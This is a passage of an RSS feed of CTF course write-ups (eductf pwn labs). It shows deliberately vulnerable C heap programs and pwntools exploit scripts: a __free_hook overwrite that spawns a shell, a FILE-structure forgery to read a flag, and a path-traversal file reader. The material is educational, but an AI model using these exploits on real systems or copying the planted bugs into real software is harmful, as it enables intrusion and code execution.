 tags: &lt;code>CTF&lt;/code> &lt;code>PWN&lt;/code> &lt;code>eductf&lt;/code>
 &lt;a class="anchor" href="#tags-ctf-pwn-eductf">#&lt;/a>
&lt;/h6>
&lt;p>Version: Ubuntu 20.04&lt;/p>
&lt;h2 id="uaf-backgroud">
 UAF backgroud
 &lt;a class="anchor" href="#uaf-backgroud">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://youtu.be/MwjSNFQIx0c">SS111-Pwn2&lt;/a>
&lt;a href="https://youtu.be/rMqvL9j0QaM?t=3009">Advanced Binary Exploitation (Pwn) - Heap Exploitation&lt;/a>
&lt;img src="https://imgur.com/nFDhGiC.png" alt="" />&lt;/p>
&lt;h2 id="original-code">
 Original Code
 &lt;a class="anchor" href="#original-code">#&lt;/a>
&lt;/h2>
&lt;pre tabindex="0">&lt;code class="language-cpp!=" data-lang="cpp!=">#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;

int main()
{
 void *p1, *p2;
 p1 = malloc(0x30);
 p2 = malloc(0x30);

 free(p1);
 free(p2);

 puts(p2);
}
&lt;/code>&lt;/pre>&lt;p>If we set the pointer to &lt;code>NULL&lt;/code> after it was freed, then we can get some vital info. from this chunk.&lt;/p></description></item><item><title>Simple PWN 0x18(Lab - `babynote`)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn-0x18lab---babynote/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn-0x18lab---babynote/</guid><description>&lt;h1 id="simple-pwn-0x18lab---babynote">
 Simple PWN 0x18(Lab - &lt;code>babynote&lt;/code>)
 &lt;a class="anchor" href="#simple-pwn-0x18lab---babynote">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ctf-pwn-eductf">
 tags: &lt;code>CTF&lt;/code> &lt;code>PWN&lt;/code> &lt;code>eductf&lt;/code>
 &lt;a class="anchor" href="#tags-ctf-pwn-eductf">#&lt;/a>
&lt;/h6>
&lt;p>Version: Ubuntu 20.04&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>hook - &lt;a href="https://youtu.be/MwjSNFQIx0c?t=838">SS111-Pwn2&lt;/a>
&lt;img src="https://imgur.com/lx8zR2J.png" alt="" />
&lt;a href="https://blog.xuite.net/peterlee.tw/twblog/112094832">Hook簡介&lt;/a>
&lt;a href="https://www.google.com/url?sa=t&amp;amp;rct=j&amp;amp;q=&amp;amp;esrc=s&amp;amp;source=web&amp;amp;cd=&amp;amp;cad=rja&amp;amp;uact=8&amp;amp;ved=2ahUKEwjIxp70jeL8AhUjQPUHHde8BDcQFnoECA4QAQ&amp;amp;url=https%3A%2F%2Fxtutlab.blogspot.com%2F2018%2F10%2Fhook-function.html&amp;amp;usg=AOvVaw26FwxmT40uQgIsFIlbjs2k">Hook Function (攔截函式)&lt;/a>&lt;/li>
&lt;li>The process of free and priority
Assume we malloc a memory with size over &lt;font color="FF0000">&lt;code>0x410&lt;/code>&lt;/font>, then when we free it, it&amp;rsquo;ll be classified to &lt;font color="FF0000">&lt;code>Unsorted bin&lt;/code>&lt;/font> instead of &lt;code>tcache&lt;/code>
&lt;img src="https://imgur.com/kCTN7cs.png" alt="" />
&lt;img src="https://imgur.com/u2Wy9xw.png" alt="" />&lt;/li>
&lt;/ul>
&lt;h2 id="original-code">
 Original Code
 &lt;a class="anchor" href="#original-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-cpp=" data-lang="cpp=">#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;

struct Note
{
 char name[0x10];
 void *data;
};

struct Note *notes[0x10];

static short int get_idx()
{
 short int idx;

 printf(&amp;#34;index\n&amp;gt; &amp;#34;);
 scanf(&amp;#34;%hu&amp;#34;, &amp;amp;idx);

 if (idx &amp;gt;= 0x10)
 printf(&amp;#34;no, no ...\n&amp;#34;), exit(1);
 
 return idx;
}

static short int get_size()
{
 short int size;

 printf(&amp;#34;size\n&amp;gt; &amp;#34;);
 scanf(&amp;#34;%hu&amp;#34;, &amp;amp;size);
 
 return size;
}

void add_note()
{
 short int idx;

 idx = get_idx();
 notes[idx] = malloc(sizeof(*notes[idx]));

 printf(&amp;#34;note name\n&amp;gt; &amp;#34;);
 read(0, notes[idx]-&amp;gt;name, 0x10);

 notes[idx]-&amp;gt;data = NULL;
 printf(&amp;#34;success!\n&amp;#34;);
}

void edit_data()
{
 short int idx;
 short int size;

 idx = get_idx();
 size = get_size();

 if (notes[idx]-&amp;gt;data == NULL)
 notes[idx]-&amp;gt;data = malloc(size);
 
 read(0, notes[idx]-&amp;gt;data, size);
 printf(&amp;#34;success!\n&amp;#34;);
}

void del_note()
{
 short int idx;

 idx = get_idx();
 free(notes[idx]-&amp;gt;data);
 free(notes[idx]);
 printf(&amp;#34;success!\n&amp;#34;);
}

void show_notes()
{
 for (int i = 0; i &amp;lt; 0x10; i++) {
 if (notes[i] == NULL || notes[i]-&amp;gt;data == NULL)
 continue;
 
 printf(&amp;#34;[%d] %s\ndata: %s\n&amp;#34;, i, notes[i]-&amp;gt;name, (char *)notes[i]-&amp;gt;data);
 }
}

int main()
{
 char opt[2];

 setvbuf(stdin, NULL, _IONBF, 0);
 setvbuf(stdout, NULL, _IONBF, 0);

 while (1)
 {
 printf(&amp;#34;1. add_note\n&amp;#34;
 &amp;#34;2. edit_data\n&amp;#34;
 &amp;#34;3. del_note\n&amp;#34;
 &amp;#34;4. show_notes\n&amp;#34;
 &amp;#34;5. bye\n&amp;#34;
 &amp;#34;&amp;gt; &amp;#34;);
 read(0, opt, 2);

 switch (opt[0]) {
 case &amp;#39;1&amp;#39;: add_note(); break;
 case &amp;#39;2&amp;#39;: edit_data(); break;
 case &amp;#39;3&amp;#39;: del_note(); break;
 case &amp;#39;4&amp;#39;: show_notes(); break;
 case &amp;#39;5&amp;#39;: exit(0);
 }
 }
 
 return 0;
}
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple PWN 0x19(Lab - `babyums` - flag 1)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn-0x19lab---babyums---flag-1/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn-0x19lab---babyums---flag-1/</guid><description>&lt;h1 id="simple-pwn-0x19lab---babyums---flag-1">
 Simple PWN 0x19(Lab - &lt;code>babyums&lt;/code> - flag 1)
 &lt;a class="anchor" href="#simple-pwn-0x19lab---babyums---flag-1">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ctf-pwn-eductf">
 tags: &lt;code>CTF&lt;/code> &lt;code>PWN&lt;/code> &lt;code>eductf&lt;/code>
 &lt;a class="anchor" href="#tags-ctf-pwn-eductf">#&lt;/a>
&lt;/h6>
&lt;p>Version: Ubuntu 20.04&lt;/p>
&lt;h2 id="original-code">
 Original Code
 &lt;a class="anchor" href="#original-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler Original Code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-cpp=" data-lang="cpp=">#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#define FLAG1 &amp;#34;flag{XXXXXXXX}&amp;#34;

struct User
{
 char name[0x10];
 char password[0x10];
 void *data;
};

struct User *users[8];

static short int get_idx()
{
 short int idx;

 printf(&amp;#34;index\n&amp;gt; &amp;#34;);
 scanf(&amp;#34;%hu&amp;#34;, &amp;amp;idx);

 if (idx &amp;gt;= 8)
 printf(&amp;#34;no, no ...&amp;#34;), exit(1);
 
 return idx;
}

static short int get_size()
{
 short int size;

 printf(&amp;#34;size\n&amp;gt; &amp;#34;);
 scanf(&amp;#34;%hu&amp;#34;, &amp;amp;size);

 if (size &amp;gt;= 0x500)
 printf(&amp;#34;no, no ...&amp;#34;), exit(1);
 
 return size;
}

void add_user()
{
 short int idx;

 idx = get_idx();
 users[idx] = malloc(sizeof(*users[idx]));

 printf(&amp;#34;username\n&amp;gt; &amp;#34;);
 read(0, users[idx]-&amp;gt;name, 0x10);

 printf(&amp;#34;password\n&amp;gt; &amp;#34;);
 read(0, users[idx]-&amp;gt;password, 0x10);

 users[idx]-&amp;gt;data = NULL;
 printf(&amp;#34;success!\n&amp;#34;);
}

void edit_data()
{
 short int idx;
 short int size;

 idx = get_idx();
 size = get_size();

 if (users[idx]-&amp;gt;data == NULL)
 users[idx]-&amp;gt;data = malloc(size);
 
 read(0, users[idx]-&amp;gt;data, size);
 printf(&amp;#34;success!\n&amp;#34;);
}

void del_user()
{
 short int idx;

 idx = get_idx();
 free(users[idx]-&amp;gt;data);
 free(users[idx]);
 printf(&amp;#34;success!\n&amp;#34;);
}

void show_users()
{
 for (int i = 0; i &amp;lt; 8; i++) {
 if (users[i] == NULL || users[i]-&amp;gt;data == NULL)
 continue;
 
 printf(&amp;#34;[%d] %s\ndata: %s\n&amp;#34;, i, users[i]-&amp;gt;name, (char *)users[i]-&amp;gt;data);
 }
}

void add_admin()
{
 users[0] = malloc(sizeof(*users[0]));
 strcpy(users[0]-&amp;gt;name, &amp;#34;admin&amp;#34;);
 strcpy(users[0]-&amp;gt;password, FLAG1);
 users[0]-&amp;gt;data = NULL;
}

int main()
{
 char opt[2];
 int power = 20;

 setvbuf(stdin, NULL, _IONBF, 0);
 setvbuf(stdout, NULL, _IONBF, 0);

 printf(&amp;#34;**** User Management System ****\n&amp;#34;);
 add_admin();

 while (power)
 {
 power--;
 printf(&amp;#34;1. add_user\n&amp;#34;
 &amp;#34;2. edit_data\n&amp;#34;
 &amp;#34;3. del_user\n&amp;#34;
 &amp;#34;4. show_users\n&amp;#34;
 &amp;#34;5. bye\n&amp;#34;
 &amp;#34;&amp;gt; &amp;#34;);
 read(0, opt, 2);

 switch (opt[0]) {
 case &amp;#39;1&amp;#39;: add_user(); break;
 case &amp;#39;2&amp;#39;: edit_data(); break;
 case &amp;#39;3&amp;#39;: del_user(); break;
 case &amp;#39;4&amp;#39;: show_users(); break;
 case &amp;#39;5&amp;#39;: exit(0);
 }
 }
 printf(&amp;#34;No... no power..., b..ye...\n&amp;#34;);
 
 return 0;
}
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple PWN 0x20(Lab - `babyums` - flag 2)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn-0x20lab---babyums---flag-2/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn-0x20lab---babyums---flag-2/</guid><description>&lt;h1 id="simple-pwn-0x20lab---babyums---flag-2">
 Simple PWN 0x20(Lab - &lt;code>babyums&lt;/code> - flag 2)
 &lt;a class="anchor" href="#simple-pwn-0x20lab---babyums---flag-2">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ctf-pwn-eductf">
 tags: &lt;code>CTF&lt;/code> &lt;code>PWN&lt;/code> &lt;code>eductf&lt;/code>
 &lt;a class="anchor" href="#tags-ctf-pwn-eductf">#&lt;/a>
&lt;/h6>
&lt;p>Version: Ubuntu 20.04&lt;/p>
&lt;h2 id="original-code">
 Original Code
 &lt;a class="anchor" href="#original-code">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://bernie6401.github.io/2bR8lalySvKfA7Zr8DOhuA">Simple PWN 0x19(Lab - &lt;code>babyums&lt;/code> - flag 1)&lt;/a>&lt;/p>
&lt;h2 id="exploit">
 Exploit
 &lt;a class="anchor" href="#exploit">#&lt;/a>
&lt;/h2>
&lt;p>Very similar in this article: &lt;a href="https://bernie6401.github.io/zj3FTgxZQ22EgRPn1KHUSg">0x18(Lab - &lt;code>babynote&lt;/code>)&lt;/a>
:::spoiler code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-python=" data-lang="python=">from pwn import *

# r = process(&amp;#39;./chal&amp;#39;)
r = remote(&amp;#39;edu-ctf.zoolab.org&amp;#39;, 10008)

context.arch = &amp;#39;amd64&amp;#39;

def add_user(idx, user_name, user_passwd):
 r.sendafter(b&amp;#39;&amp;gt; &amp;#39;, b&amp;#39;1&amp;#39;)
 r.sendlineafter(b&amp;#39;index\n&amp;gt; &amp;#39;, str(idx))
 r.sendafter(b&amp;#39;username\n&amp;gt; &amp;#39;, user_name)
 r.sendafter(b&amp;#39;password\n&amp;gt; &amp;#39;, user_passwd)

def edit_data(idx, note_size, message):
 r.sendafter(b&amp;#34;&amp;gt; &amp;#34;, b&amp;#34;2&amp;#34;)
 r.sendlineafter(b&amp;#39;index\n&amp;gt; &amp;#39;, str(idx))
 r.sendlineafter(b&amp;#39;size\n&amp;gt; &amp;#39;, str(note_size))
 r.send(message)

def del_user(idx):
 r.sendafter(b&amp;#34;&amp;gt; &amp;#34;, b&amp;#34;3&amp;#34;)
 r.sendlineafter(b&amp;#39;index\n&amp;gt; &amp;#39;, str(idx))

def show_user():
 r.sendafter(b&amp;#34;&amp;gt; &amp;#34;, b&amp;#34;4&amp;#34;)


&amp;#39;&amp;#39;&amp;#39;------------------
Construct heap memory
------------------&amp;#39;&amp;#39;&amp;#39;
add_user(0, b&amp;#39;a&amp;#39;*8, b&amp;#39;aaaa&amp;#39;)
edit_data(0, 0x418, b&amp;#39;a&amp;#39;)

add_user(1, b&amp;#39;b&amp;#39;*8, b&amp;#39;bbbb&amp;#39;)
edit_data(1, 0x18, b&amp;#39;b&amp;#39;)

add_user(2, b&amp;#39;c&amp;#39;*8, b&amp;#39;cccc&amp;#39;)

&amp;#39;&amp;#39;&amp;#39;------------------
Leak libc address
------------------&amp;#39;&amp;#39;&amp;#39;
del_user(0)
show_user()
r.recvuntil(b&amp;#39;data:&amp;#39;)
libc = (u64(r.recv(8)) &amp;gt;&amp;gt; 8) - 0x1ecbe0 - 0xa000000000000
info(f&amp;#34;libc address: {hex(libc)}&amp;#34;)
free_hook_addr = libc + 0x1eee48
info(f&amp;#34;__free_hook address: {hex(free_hook_addr)}&amp;#34;)
libc_sys_addr = libc + 0x52290
info(f&amp;#34;__libc_system address: {hex(libc_sys_addr)}&amp;#34;)

&amp;#39;&amp;#39;&amp;#39;------------------
Construct fake chunk
------------------&amp;#39;&amp;#39;&amp;#39;
data = b&amp;#39;/bin/sh\x00&amp;#39;.ljust(0x10, b&amp;#39;b&amp;#39;)
fake_chunk = flat(
 0, 0x31,
 b&amp;#39;cccccccc&amp;#39;, b&amp;#39;cccccccc&amp;#39;,
 b&amp;#39;cccccccc&amp;#39;, b&amp;#39;cccccccc&amp;#39;,
 free_hook_addr
)

edit_data(1, 0x48, data + fake_chunk)
edit_data(2, 0x8, p64(libc_sys_addr))
del_user(1)

r.interactive()
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple PWN 0x21(fopen, fread, fwrite, fclose)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn-0x21fopen-fread-fwrite-fclose/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn-0x21fopen-fread-fwrite-fclose/</guid><description>&lt;h1 id="simple-pwn-0x21fopen-fread-fwrite-fclose">
 Simple PWN 0x21(fopen, fread, fwrite, fclose)
 &lt;a class="anchor" href="#simple-pwn-0x21fopen-fread-fwrite-fclose">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ctf-pwn-eductf">
 tags: &lt;code>CTF&lt;/code> &lt;code>PWN&lt;/code> &lt;code>eductf&lt;/code>
 &lt;a class="anchor" href="#tags-ctf-pwn-eductf">#&lt;/a>
&lt;/h6>
&lt;p>Version: Ubuntu 20.04&lt;/p>
&lt;h2 id="original-code">
 Original Code
 &lt;a class="anchor" href="#original-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler fopen&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-cpp=" data-lang="cpp=">#include &amp;lt;fcntl.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;

int main()
{
 FILE *fp;
 fp = fopen(&amp;#34;./test&amp;#34;, &amp;#34;r&amp;#34;);
 fclose(fp);

 return 0;
}
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p>
&lt;p>:::spoiler fread&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-cpp=" data-lang="cpp=">#include &amp;lt;fcntl.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;

int main()
{
 FILE *fp;
 char buf[0x10];

 fp = fopen(&amp;#34;./test&amp;#34;, &amp;#34;r&amp;#34;);
 fread(buf, 0x1, 0x10, fp);
 fclose(fp);

 return 0;
}
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p>
&lt;p>:::spoiler fwrite&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-cpp=" data-lang="cpp=">#include &amp;lt;fcntl.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;

int main()
{
 FILE *fp;
 char buf[0x10] = &amp;#34;TEST!!&amp;#34;;

 fp = fopen(&amp;#34;./test_write&amp;#34;, &amp;#34;r&amp;#34;);
 fread(buf, 0x1, 0x10, fp);
 fclose(fp);

 return 0;
}
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple PWN 0x22(Lab - `AAR`)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn-0x22lab---aar/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn-0x22lab---aar/</guid><description>&lt;h1 id="simple-pwn-0x22lab---aar">
 Simple PWN 0x22(Lab - &lt;code>AAR&lt;/code>)
 &lt;a class="anchor" href="#simple-pwn-0x22lab---aar">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ctf-pwn-eductf">
 tags: &lt;code>CTF&lt;/code> &lt;code>PWN&lt;/code> &lt;code>eductf&lt;/code>
 &lt;a class="anchor" href="#tags-ctf-pwn-eductf">#&lt;/a>
&lt;/h6>
&lt;p>Version: Ubuntu 20.04&lt;/p>
&lt;h2 id="original-code">
 Original Code
 &lt;a class="anchor" href="#original-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler Original Code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-cpp=" data-lang="cpp=">#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;fcntl.h&amp;gt;

char flag[0x10] = &amp;#34;FLAG{TEST}\n&amp;#34;;

int main()
{
 FILE *fp;
 char *buf;

 buf = malloc(0x10);
 fp = fopen(&amp;#34;/tmp/meow&amp;#34;, &amp;#34;w&amp;#34;);
 read(0, buf, 0x1000);
 fwrite(buf, 0x10, 1, fp);
 return 0;
}
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p>
&lt;h2 id="exploit---heap-overflow--overlap-flag">
 Exploit - heap overflow + overlap flag
 &lt;a class="anchor" href="#exploit---heap-overflow--overlap-flag">#&lt;/a>
&lt;/h2>
&lt;pre tabindex="0">&lt;code class="language-python=" data-lang="python=">from pwn import *

# r = process(&amp;#39;./chal&amp;#39;)
r = remote(&amp;#39;edu-ctf.zoolab.org&amp;#39;, 10010)

context.arch = &amp;#39;amd64&amp;#39;

flag_addr = 0x404050

raw_input()
payload = flat(
 p64(0)*4,
 p64(0xfbad0800), #_flags
 p64(0), #_IO_read_ptr
 p64(flag_addr), #_IO_read_end
 p64(0), #_IO_read_base
 p64(flag_addr), #_IO_write_base
 p64(flag_addr+0x10), #_IO_write_ptr
 p64(0)*8, #_IO_write_end + _IO_buf_base + _IO_buf_end + _chain
 p64(0x1) #_fileno
)

r.send(payload)

r.interactive()
&lt;/code>&lt;/pre></description></item><item><title>Simple PWN 0x23(Lab - `AAW`)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn-0x23lab---aaw/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn-0x23lab---aaw/</guid><description>&lt;h1 id="simple-pwn-0x23lab---aaw">
 Simple PWN 0x23(Lab - &lt;code>AAW&lt;/code>)
 &lt;a class="anchor" href="#simple-pwn-0x23lab---aaw">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ctf-pwn-eductf">
 tags: &lt;code>CTF&lt;/code> &lt;code>PWN&lt;/code> &lt;code>eductf&lt;/code>
 &lt;a class="anchor" href="#tags-ctf-pwn-eductf">#&lt;/a>
&lt;/h6>
&lt;p>Version: Ubuntu 20.04&lt;/p>
&lt;h2 id="original-code">
 Original Code
 &lt;a class="anchor" href="#original-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler Original Code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-cpp=" data-lang="cpp=">#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
#include &amp;lt;fcntl.h&amp;gt;

char flag[0x10] = &amp;#34;FLAG{TEST}\n&amp;#34;;
char owo[] = &amp;#34;OWO!&amp;#34;;

int main()
{
 FILE *fp;
 char *buf;

 buf = malloc(0x10);
 fp = fopen(&amp;#34;/tmp/meow&amp;#34;, &amp;#34;r&amp;#34;);
 read(0, buf, 0x1000);
 fread(buf, 0x10, 1, fp);

 if (strcmp(owo, &amp;#34;OWO!&amp;#34;) != 0)
 write(1, flag, sizeof(flag));

 return 0;
}
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple PWN 0x31(2023 HW - Notepad - Stage - 1)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn-0x312023-hw---notepad---stage---1/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn-0x312023-hw---notepad---stage---1/</guid><description>&lt;h1 id="simple-pwn-0x312023-hw---notepad---stage---1">
 Simple PWN 0x31(2023 HW - Notepad - Stage - 1)
 &lt;a class="anchor" href="#simple-pwn-0x312023-hw---notepad---stage---1">#&lt;/a>
&lt;/h1>
&lt;h2 id="description--hint">
 Description &amp;amp; Hint
 &lt;a class="anchor" href="#description--hint">#&lt;/a>
&lt;/h2>
&lt;blockquote>
&lt;p>nc 10.113.184.121 10044&lt;/p>
&lt;p>You should solve the PoW to invoke a new instance.
You can use the pow_solver.py script in the released zip to solve the PoW.
After you solve the PoW, the service will create a new container and show &amp;gt;you the port. Connect it to play this challenge!
The container will be destroy at 5 minutes. So you should debug your exploit in your environment.&lt;/p></description></item><item><title>Simple PWN 0x32(2023 HW - Notepad-Stage 2)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn-0x322023-hw---notepad-stage-2/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn-0x322023-hw---notepad-stage-2/</guid><description>&lt;h1 id="simple-pwn-0x322023-hw---notepad-stage-2">
 Simple PWN 0x32(2023 HW - Notepad-Stage 2)
 &lt;a class="anchor" href="#simple-pwn-0x322023-hw---notepad-stage-2">#&lt;/a>
&lt;/h1>
&lt;h2 id="description--hint">
 Description &amp;amp; Hint
 &lt;a class="anchor" href="#description--hint">#&lt;/a>
&lt;/h2>
&lt;blockquote>
&lt;p>Try to get /flag_backend.&lt;/p>
&lt;p>Hint1: The only intended vulnerability in the frontend (notepad) is the path traversal.
Hint2: Try to write the shellcode into process memory by the path traversal vulnerability.&lt;/p>&lt;/blockquote>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>呈上題&lt;/p>
&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;p>:::success
Special Thanks @cs-otaku For the most of the Inspiration of the WP
:::&lt;/p>
&lt;ul>
&lt;li>Recap
在上一題，我們已經知道了他的前端漏洞為path traversal，換言之是不是可以做到任意讀取的功能，如下:
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">read_any_file&lt;/span>(file_name):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> payload &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;../../../../../../&amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;/&amp;#39;&lt;/span> &lt;span style="color:#f92672">*&lt;/span> (&lt;span style="color:#ae81ff">89&lt;/span> &lt;span style="color:#f92672">-&lt;/span> len(file_name)) &lt;span style="color:#f92672">+&lt;/span> file_name
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> offset &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> res &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">while&lt;/span>(&lt;span style="color:#66d9ef">True&lt;/span>):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ret &lt;span style="color:#f92672">=&lt;/span> dealing_cmd(r, &lt;span style="color:#ae81ff">5&lt;/span>, payload, offset&lt;span style="color:#f92672">=&lt;/span>str(offset)&lt;span style="color:#f92672">.&lt;/span>encode())
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># print(ret, len(ret))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ret &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;Read note failed.&amp;#39;&lt;/span> &lt;span style="color:#f92672">and&lt;/span> ret &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;Couldn&amp;#39;t open the file.&amp;#34;&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> res &lt;span style="color:#f92672">+=&lt;/span> ret
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> offset &lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#ae81ff">128&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> log&lt;span style="color:#f92672">.&lt;/span>success(res)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">break&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> res
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ul>
&lt;ol>
&lt;li>
&lt;p>==漏洞發想==
透過@cs-otaku的WP，了解到如果可以做到任意讀取有甚麼厲害的地方呢?那我們就可以想辦法用該題提供的write_note的功能以及lseek的功能，寫入==/proc/self/mem==這個檔案，這是甚麼東西呢?可以看一下&lt;a href="http://blog.coderhuo.tech/2017/10/12/Virtual_Memory_C_strings_proc/">虛擬內存探究 &amp;ndash; 第一篇:C strings &amp;amp; /proc&lt;/a>，要做的事情和我們的幾乎一樣，簡單說就是&lt;/p></description></item><item><title>Simple PWN 0x33(2023 Lab - ROP_RW)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn-0x332023-lab---rop_rw/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn-0x332023-lab---rop_rw/</guid><description>&lt;h1 id="simple-pwn-0x332023-lab---rop_rw">
 Simple PWN 0x33(2023 Lab - ROP_RW)
 &lt;a class="anchor" href="#simple-pwn-0x332023-lab---rop_rw">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>ROP chain&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler Source Code&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdio.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
